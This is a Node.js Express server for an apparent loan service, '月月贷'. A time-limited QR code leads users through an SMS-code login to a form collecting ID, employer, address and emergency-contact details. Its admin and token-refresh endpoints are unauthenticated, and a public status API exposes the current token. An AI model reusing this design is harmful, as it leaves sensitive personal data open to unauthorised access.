/**
 * 扫码填表审核系统 - 服务端 (Render版)
 * 支持二维码5分钟有效期 + 后台管理页 + Render防休眠自保活
 */
const express = require('express');
const QRCode = require('qrcode');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const QR_VALID_MS = 5 * 60 * 1000; // 5分钟有效期

// ========== 当前有效 token ==========
let currentToken = '';
let tokenCreatedAt = 0;

// 初始化 token
function generateToken() {
  currentToken = crypto.randomBytes(16).toString('hex');
  tokenCreatedAt = Date.now();
  console.log(`  🔑 新 Token: ${currentToken}  (${new Date(tokenCreatedAt).toLocaleString('zh-CN')})`);
}
generateToken();

// ========== 验证码 & 会话 & 用户（内存存储）==========
const CODE_VALID_MS = 5 * 60 * 1000;   // 验证码5分钟内有效
const SESSION_VALID_MS = 30 * 60 * 1000; // 会话30分钟有效

const verificationCodes = new Map();  // phone -> { code, expiresAt }
const userSessions = new Map();       // sessionId -> { phone, createdAt }
const users = new Map();              // phone -> { phone, createdAt }  简易用户库

// 生成6位随机验证码
function genCode() {
  return String(Math.floor(100000 + Math.random() * 900000));
}

// 清除过期数据
setInterval(() => {
  const now = Date.now();
  for (const [k, v] of verificationCodes) { if (now > v.expiresAt) verificationCodes.delete(k); }
  for (const [k, v] of userSessions) { if (now > v.createdAt + SESSION_VALID_MS) userSessions.delete(k); }
}, 60 * 1000);

// ========== Express 配置 ==========
app.set('trust proxy', true);
app.use(express.json());

// ========== 工具函数 ==========
function getHost(req) {
  const raw = req.headers['x-forwarded-host'] || req.headers['host'] || 'localhost';
  return raw.split(':')[0].trim();
}

function getFormUrl(req) {
  // 扫码后先跳转登录注册页（auth），验证通过后再到表单页
  return `https://${getHost(req)}/auth.html?token=${currentToken}`;
}

// ========== /auth.html Token 校验（扫码后先进登录页）==========
app.get('/auth.html', (req, res, next) => {
  const token = req.query.token || '';
  if (!token || token !== currentToken) {
    return res.send(expiredPage(currentToken));
  }
  const elapsed = Date.now() - tokenCreatedAt;
  if (elapsed > QR_VALID_MS) {
    return res.send(expiredPage(currentToken));
  }
  next();
});

// ========== /form.html Token + Session 校验 ==========
app.get('/form.html', (req, res, next) => {
  const token = req.query.token || '';
  const session = req.query.session || '';

  // 先校验 token
  if (!token || token !== currentToken) {
    return res.send(expiredPage(currentToken));
  }
  const elapsed = Date.now() - tokenCreatedAt;
  if (elapsed > QR_VALID_MS) {
    return res.send(expiredPage(currentToken));
  }
  // 再校验登录会话
  if (!session || !userSessions.has(session)) {
    // 未登录 → 重定向回登录页
    return res.redirect(`/auth.html?token=${encodeURIComponent(token)}`);
  }
  next();
});

// ========== 静态文件（放在 token 校验之后）==========
app.use(express.static(path.join(__dirname, 'public')));

// ========== 首页：显示二维码 ==========
app.get('/', async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
    return res.redirect(`/auth.html?token=${currentToken}`);
  }
  const formUrl = getFormUrl(req);
  try {
    const qrDataURL = await QRCode.toDataURL(formUrl, {
      width: 350,
      margin: 2,
      color: { dark: '#1D4ED8', light: '#ffffff' }
    });
    const serverNow = Date.now();
    const expiresAt = tokenCreatedAt + QR_VALID_MS;
    const remainingMs = Math.max(0, expiresAt - serverNow);
    const remaining = Math.floor(remainingMs / 1000);
    const min = Math.floor(remaining / 60);
    const sec = remaining % 60;
    res.send(`<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>月月贷 - 扫码填表</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Microsoft YaHei',sans-serif;
  background:linear-gradient(160deg,#0F172A,#1E1B4B);
  min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;
}
.container{text-align:center;padding:40px 24px;max-width:480px;width:100%}
.logo{font-size:56px;margin-bottom:16px}
h1{font-size:32px;font-weight:800;margin-bottom:8px;background:linear-gradient(135deg,#60A5FA,#A78BFA);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.subtitle{font-size:15px;color:rgba(255,255,255,.55);margin-bottom:40px}
.qr-box{
  display:inline-block;background:#fff;padding:20px;border-radius:24px;
  box-shadow:0 0 60px rgba(37,99,235,.3);position:relative;
}
.qr-box img{display:block;width:280px;height:280px}
.qr-tip{margin-top:18px;font-size:14px;color:rgba(255,255,255,.65)}
.qr-expire{
  margin-top:8px;font-size:13px;font-weight:600;
}
.qr-expire.valid{color:#34D399}
.qr-expire.warn{color:#FBBF24}
.qr-expire.dead{color:#F87171}
.url-row{
  margin-top:28px;background:rgba(255,255,255,.08);border-radius:12px;
  padding:14px 20px;display:inline-flex;align-items:center;gap:8px;
  font-size:13px;color:rgba(255,255,255,.5);word-break:break-all;
}
.url-row b{color:#60A5FA;font-weight:600}
.features{
  display:grid;grid-template-columns:1fr 1fr;gap:12px;
  margin-top:36px;text-align:left;
}
.feat{
  background:rgba(255,255,255,.06);border-radius:14px;
  padding:16px 18px;font-size:13px;
}
.feat .f-icon{font-size:24px;display:block;margin-bottom:6px}
.feat .f-title{font-weight:700;color:#fff;margin-bottom:4px}
.feat .f-desc{color:rgba(255,255,255,.45);line-height:1.5}
/* 过期遮罩 */
.overlay-bg{
  display:none;position:absolute;top:0;left:0;right:0;bottom:0;
  background:rgba(0,0,0,.6);border-radius:24px;
  align-items:center;justify-content:center;
}
.overlay-bg.show{display:flex}
.overlay-msg{
  background:#EF4444;color:#fff;
  padding:10px 20px;border-radius:10px;
  font-size:14px;font-weight:700;
}
</style>
</head>
<body>
<div class="container">
  <div class="logo">🏦</div>
  <h1>月月贷</h1>
  <p class="subtitle">请使用手机扫描下方二维码填写资料</p>
  <div class="qr-box" id="qrBox">
    <img src="${qrDataURL}" alt="扫码填表二维码">
    <div class="overlay-bg" id="qrOverlay">
      <span class="overlay-msg">⏰ 二维码已过期</span>
    </div>
  </div>
  <p class="qr-tip">📱 微信 / 浏览器扫一扫（右键二维码可保存图片）</p>
  <p class="qr-expire valid" id="qrExpire">⏱ 有效期剩余：${min}分${sec}秒</p>
  <div class="url-row">
    🔗<b>${formUrl}</b>
  </div>
  <div class="features">
    <div class="feat"><span class="f-icon">🆔</span><span class="f-title">身份证信息</span><span class="f-desc">姓名、身份证号、性别、民族</span></div>
    <div class="feat"><span class="f-icon">🏢</span><span class="f-title">单位信息</span><span class="f-desc">单位名称、职位职务</span></div>
    <div class="feat"><span class="f-icon">🏠</span><span class="f-title">住址信息</span><span class="f-desc">省市区、详细地址</span></div>
    <div class="feat"><span class="f-icon">📞</span><span class="f-title">联系人信息</span><span class="f-desc">紧急联系人及关系</span></div>
  </div>
</div>
<script>
let expiresAt=${expiresAt},clockOffset=${serverNow}-Date.now();
const expireEl=document.getElementById('qrExpire');
const overlay=document.getElementById('qrOverlay');

function tick(){
  const r=Math.max(0,expiresAt-(Date.now()+clockOffset));
  const sec=Math.floor(r/1000),m=Math.floor(sec/60),s=sec%60;
  expireEl.textContent='⏱ 有效期剩余：'+m+'分'+s+'秒';
  expireEl.className='qr-expire '+(sec>60?'valid':sec>0?'warn':'dead');
  if(sec<=0){overlay.classList.add('show');clearInterval(timer)}
}
let timer=setInterval(tick,200);tick();

// 每2秒向服务端同步最新过期时间（防止token被人刷新后本地还拿旧值）
setInterval(async()=>{
  try{
    const r=await fetch('/api/status');
    const d=await r.json();
    clockOffset=d.serverNow-Date.now();
    if(d.expiresAt!==expiresAt){expiresAt=d.expiresAt;tick()}
  }catch(e){}
},2000);
</script>
</body>
</html>`);
  } catch (err) {
    res.status(500).send('二维码生成失败');
  }
});

// ========== API：刷新 token ==========
app.post('/api/refresh', (req, res) => {
  generateToken();
  res.json({ ok: true, token: currentToken, createdAt: new Date(tokenCreatedAt).toLocaleString('zh-CN') });
});

// ========== API：状态同步（客户端轮询）==========
app.get('/api/status', (req, res) => {
  res.json({
    expiresAt: tokenCreatedAt + QR_VALID_MS,
    token: currentToken,
    serverNow: Date.now()
  });
});

// ========== API：发送短信验证码 ==========
app.post('/api/send-code', (req, res) => {
  const { phone } = req.body || {};
  if (!phone || !/^1[3-9]\d{9}$/.test(phone)) {
    return res.json({ ok: false, msg: '请输入正确的手机号' });
  }

  // 检查是否已发送且在有效期内（防止频繁发送）
  const existing = verificationCodes.get(phone);
  if (existing && Date.now() - (existing.expiresAt - CODE_VALID_MS) < 60000) {
    return res.json({ ok: false, msg: '发送过于频繁，请60秒后再试' });
  }

  const code = genCode();
  verificationCodes.set(phone, {
    code: code,
    expiresAt: Date.now() + CODE_VALID_MS
  });

  // 模拟发送短信：打印到控制台
  console.log(`\n  📱 ===== 短信验证码 =====`);
  console.log(`  手机号：${phone}`);
  console.log(`  验证码：${code}`);
  console.log(`  有效期：5分钟`);
  console.log(`  ========================\n`);

  res.json({ ok: true });
});

// ========== API：验证短信码并登录/注册 ==========
app.post('/api/verify-code', (req, res) => {
  const { phone, code, token } = req.body || {};

  // 校验 token
  if (!token || token !== currentToken) {
    return res.json({ ok: false, msg: '二维码已过期，请重新扫码' });
  }

  // 校验手机号
  if (!phone || !/^1[3-9]\d{9}$/.test(phone)) {
    return res.json({ ok: false, msg: '手机号格式不正确' });
  }

  // 校验验证码
  const record = verificationCodes.get(phone);
  if (!record) {
    return res.json({ ok: false, msg: '请先获取验证码' });
  }
  if (Date.now() > record.expiresAt) {
    verificationCodes.delete(phone);
    return res.json({ ok: false, msg: '验证码已过期，请重新获取' });
  }
  if (record.code !== code) {
    return res.json({ ok: false, msg: '验证码错误' });
  }

  // 验证码通过 → 清除、创建/更新用户、生成会话
  verificationCodes.delete(phone);

  if (!users.has(phone)) {
    users.set(phone, { phone, createdAt: Date.now() });
    console.log(`  👤 新用户注册：${phone}`);
  } else {
    console.log(`  👤 用户登录：${phone}`);
  }

  const sessionId = crypto.randomBytes(24).toString('hex');
  userSessions.set(sessionId, { phone, createdAt: Date.now() });

  res.json({ ok: true, session: sessionId, phone: phone });
});

// ========== 后台管理页 ==========
app.get('/admin', async (req, res) => {
  const formUrl = getFormUrl(req);
  try {
    const qrDataURL = await QRCode.toDataURL(formUrl, {
      width: 300,
      margin: 2,
      color: { dark: '#1D4ED8', light: '#ffffff' }
    });
    const serverNow = Date.now();
    const expiresAt = tokenCreatedAt + QR_VALID_MS;
    const remainingMs = Math.max(0, expiresAt - serverNow);
    const remaining = Math.floor(remainingMs / 1000);
    const min = Math.floor(remaining / 60);
    const sec = remaining % 60;
    res.send(`<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>后台管理 - 月月贷</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Microsoft YaHei',sans-serif;
  background:#0F172A;color:#fff;min-height:100vh;
  display:flex;align-items:center;justify-content:center;
}
.card{
  background:#1E293B;border-radius:20px;padding:36px 32px;
  max-width:420px;width:100%;text-align:center;
  box-shadow:0 8px 40px rgba(0,0,0,.4);
}
h2{font-size:22px;margin-bottom:6px}
.card-sub{font-size:13px;color:rgba(255,255,255,.45);margin-bottom:28px}
.qr-wrap{
  display:inline-block;background:#fff;padding:16px;border-radius:16px;
  box-shadow:0 0 40px rgba(37,99,235,.25);
}
.qr-wrap img{display:block;width:240px;height:240px}
.qr-valid{
  margin-top:16px;font-size:14px;padding:8px 20px;border-radius:20px;
  display:inline-block;
}
.qr-valid.ok{background:rgba(52,211,153,.15);color:#34D399}
.qr-valid.warn{background:rgba(251,191,36,.15);color:#FBBF24}
.qr-valid.dead{background:rgba(248,113,113,.15);color:#F87171}
.info-box{
  margin-top:20px;background:rgba(255,255,255,.05);border-radius:12px;
  padding:14px 18px;text-align:left;font-size:13px;line-height:2;
}
.info-box .label{color:rgba(255,255,255,.4)}
.info-box .val{color:#60A5FA;font-weight:600;word-break:break-all}
.btn-refresh{
  margin-top:24px;width:100%;height:50px;
  background:linear-gradient(135deg,#2563EB,#5B21B6);
  color:#fff;border:none;font-size:17px;font-weight:700;
  border-radius:14px;cursor:pointer;
  box-shadow:0 4px 20px rgba(37,99,235,.3);
  transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px;
}
.btn-refresh:active{opacity:.85;transform:scale(.97)}
.btn-refresh.loading{pointer-events:none;opacity:.6}
.back-link{margin-top:16px;display:inline-block;font-size:13px;color:rgba(255,255,255,.3);text-decoration:none}
.back-link:hover{color:rgba(255,255,255,.6)}
.toast{
  position:fixed;top:24px;left:50%;transform:translateX(-50%);
  background:#10B981;color:#fff;font-size:14px;font-weight:600;
  padding:10px 28px;border-radius:10px;z-index:999;
  opacity:0;transition:opacity .3s;pointer-events:none;
}
.toast.show{opacity:1}
</style>
</head>
<body>
<div class="card">
  <h2>⚙️ 后台管理</h2>
  <p class="card-sub">刷新二维码 · 重置有效期</p>
  <div class="qr-wrap" id="qrWrap">
    <img src="${qrDataURL}" id="qrImg" alt="当前二维码">
  </div>
  <p class="qr-valid ok" id="validTag">⏱ ${min}分${sec}秒后过期</p>
  <div class="info-box">
    <div><span class="label">Token：</span><span class="val" id="infoToken">${currentToken.substring(0,16)}...</span></div>
    <div><span class="label">创建时间：</span><span class="val" id="infoTime">${new Date(tokenCreatedAt).toLocaleString('zh-CN')}</span></div>
    <div><span class="label">有效期：</span><span class="val">5 分钟</span></div>
  </div>
  <button class="btn-refresh" id="btnRefresh" onclick="doRefresh()">
    🔄 刷新二维码
  </button>
  <a class="back-link" href="/">← 返回首页</a>
</div>
<div class="toast" id="toast"></div>
<script>
let expiresAt=${expiresAt},clockOffset=${serverNow}-Date.now();
const vt=document.getElementById('validTag');
const btn=document.getElementById('btnRefresh');
const toast=document.getElementById('toast');

function showToast(msg){
  toast.textContent=msg;toast.classList.add('show');
  setTimeout(()=>toast.classList.remove('show'),2000);
}

function tickTag(){
  const r=Math.max(0,expiresAt-(Date.now()+clockOffset));
  const s=Math.floor(r/1000),m=Math.floor(s/60),sec=s%60;
  vt.textContent='⏱ '+(s>0?m+'分'+sec+'秒后过期':'已过期');
  vt.className='qr-valid '+(s>60?'ok':s>0?'warn':'dead');
}
setInterval(tickTag,200);

// 每2秒向服务端同步最新过期时间
setInterval(async()=>{
  try{
    const r=await fetch('/api/status');
    const d=await r.json();
    clockOffset=d.serverNow-Date.now();
    if(d.expiresAt!==expiresAt){expiresAt=d.expiresAt;tickTag()}
  }catch(e){}
},2000);

async function doRefresh(){
  btn.classList.add('loading');
  btn.innerHTML='⏳ 刷新中...';
  try{
    const r=await fetch('/api/refresh',{method:'POST'});
    const d=await r.json();
    if(!d.ok) throw new Error('刷新失败');
    location.reload();
  }catch(e){
    showToast('❌ 刷新失败，请重试');
    btn.classList.remove('loading');
    btn.innerHTML='🔄 刷新二维码';
  }
}
</script>
</body>
</html>`);
  } catch (err) {
    res.status(500).send('后台页面生成失败');
  }
});

// ========== 过期提示页 ==========
function expiredPage(token) {
  return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>链接已过期</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Microsoft YaHei',sans-serif;
  background:#F2F3F7;min-height:100vh;
  display:flex;align-items:center;justify-content:center;
}
.card{
  background:#fff;border-radius:20px;padding:40px 32px;
  max-width:360px;width:100%;text-align:center;
  box-shadow:0 4px 24px rgba(0,0,0,.08);
}
.icon{font-size:56px;margin-bottom:16px}
h2{font-size:20px;color:#1a1a1a;margin-bottom:8px}
.desc{font-size:14px;color:#999;margin-bottom:24px;line-height:1.6}
</style>
</head>
<body>
<div class="card">
  <div class="icon">⏰</div>
  <h2>链接已过期</h2>
  <p class="desc">该二维码链接已超过5分钟有效期<br>请联系管理员获取新的二维码</p>
</div>
</body>
</html>`;
}

// ========== 自保活：每3分钟ping自己，防止Render免费版15分钟休眠 ==========
const http = require('http');
const keepAliveUrl = process.env.RENDER_EXTERNAL_URL 
  ? new URL(process.env.RENDER_EXTERNAL_URL).origin 
  : `http://127.0.0.1:${PORT}`;

setInterval(() => {
  // 优先用外部URL（防休眠更可靠），否则用本地回环
  const proto = keepAliveUrl.startsWith('https') ? require('https') : http;
  proto.get(`${keepAliveUrl}/api/status`, (res) => {
    res.resume();
  }).on('error', () => {
    // 外部URL不可用时，回退到本地ping
    http.get(`http://127.0.0.1:${PORT}/api/status`, (r) => r.resume()).on('error', () => {});
  });
}, 3 * 60 * 1000);

// ========== 启动 ==========
app.listen(PORT, '0.0.0.0', () => {
  console.log(`  ✅ 月月贷 扫码填表系统已启动 → 端口 ${PORT}`);
  console.log(`  🕐 二维码有效期：5分钟`);
  console.log(`  🔧 后台管理：/admin`);
  console.log(`  🔄 自保活已启用（每3分钟）`);
});
